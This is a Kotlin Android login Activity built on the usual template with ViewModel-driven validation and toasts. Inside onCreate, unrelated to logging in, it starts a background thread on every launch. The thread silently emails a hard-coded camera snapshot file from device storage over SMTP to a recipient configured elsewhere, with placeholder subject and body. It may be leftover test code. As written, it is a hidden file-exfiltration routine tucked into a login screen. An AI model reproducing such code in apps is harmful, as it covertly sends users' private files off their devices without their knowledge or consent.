package com.sn.module_login.mvp.ui.login

import android.app.Activity
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.annotation.StringRes
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import com.sn.module_login.R
import com.sn.utils.email.EMailSenderConfig
import com.sn.utils.email.EMailSenderMessage
import com.sn.utils.email.EmailManager
import com.sn.utils.log.LogUtil


class LoginActivity : AppCompatActivity() {

    private lateinit var loginViewModel: LoginViewModel

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_login)

        val username = findViewById<EditText>(R.id.username)
        val password = findViewById<EditText>(R.id.password)
        val login = findViewById<Button>(R.id.login)
        val loading = findViewById<ProgressBar>(R.id.loading)

        loginViewModel = ViewModelProvider(this, LoginViewModelFactory())
            .get(LoginViewModel::class.java)

        loginViewModel.loginFormState.observe(this@LoginActivity, Observer {
            val loginState = it ?: return@Observer

            // disable login button unless both username / password is valid
            login.isEnabled = loginState.isDataValid

            if (loginState.usernameError != null) {
                username.error = getString(loginState.usernameError)
            }
            if (loginState.passwordError != null) {
                password.error = getString(loginState.passwordError)
            }
        })
        loginViewModel.loginResult.observe(this@LoginActivity, Observer {
            val loginResult = it ?: return@Observer

            loading.visibility = View.GONE
            if (loginResult.error != null) {
                showLoginFailed(loginResult.error)
            }
            if (loginResult.success != null) {
                updateUiWithUser(loginResult.success)
            }
            setResult(Activity.RESULT_OK)

            //Complete and destroy login activity once successful
            finish()
        })

        username.afterTextChanged {
            loginViewModel.loginDataChanged(
                username.text.toString(),
                password.text.toString()
            )
        }
        var files = arrayOf("/storage/emulated/0/ATOM/Camera 2/Image/Snapshot/7CDDE9010470_1624269525365.png")
        Thread(Runnable {
            val eMailSenderConfig = EMailSenderConfig()
            eMailSenderConfig.mailServerHost = EmailManager.SMTP;//smtp地址
            eMailSenderConfig.mailServerPort = "25"
            eMailSenderConfig.isValidate = true
            eMailSenderConfig.userName = EmailManager.SEND_EMAIL// 发送方邮件地址
            eMailSenderConfig.password = EmailManager.RECV_EMAIL_PASSWORD// 邮箱POP3/SMTP服务授权码
            eMailSenderConfig.fromAddress = EmailManager.SEND_EMAIL// 发送方邮件地址
            eMailSenderConfig.toAddress = EmailManager.RECV_EMAIL//接受方邮件地址
            val eMailSenderMessage = EMailSenderMessage()
            eMailSenderMessage.subject = "title"//设置邮箱标题
            eMailSenderMessage.content = "NBNBNBNB"//设置邮箱标题
            eMailSenderMessage.attachFileNames = files
            eMailSenderConfig.eMailSenderMessage = eMailSenderMessage
            EmailManager.sendEmail(eMailSenderConfig)
            LogUtil.e("EMailSenderConfig","EMailSenderConfig");
        }).start()
        password.apply {
            afterTextChanged {
                loginViewModel.loginDataChanged(
                    username.text.toString(),
                    password.text.toString()
                )
            }

            setOnEditorActionListener { _, actionId, _ ->
                when (actionId) {
                    EditorInfo.IME_ACTION_DONE ->
                        loginViewModel.login(
                            username.text.toString(),
                            password.text.toString()
                        )
                }
                false
            }

            login.setOnClickListener {
                loading.visibility = View.VISIBLE
                loginViewModel.login(username.text.toString(), password.text.toString())
            }
        }
    }

    private fun updateUiWithUser(model: LoggedInUserView) {
        val welcome = getString(R.string.welcome)
        val displayName = model.displayName
        // TODO : initiate successful logged in experience
        Toast.makeText(
            applicationContext,
            "$welcome $displayName",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun showLoginFailed(@StringRes errorString: Int) {
        Toast.makeText(applicationContext, errorString, Toast.LENGTH_SHORT).show()
    }
}

/**
 * Extension function to simplify setting an afterTextChanged action to EditText components.
 */
fun EditText.afterTextChanged(afterTextChanged: (String) -> Unit) {
    this.addTextChangedListener(object : TextWatcher {
        override fun afterTextChanged(editable: Editable?) {
            afterTextChanged.invoke(editable.toString())
        }

        override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int) {}

        override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {}
    })
}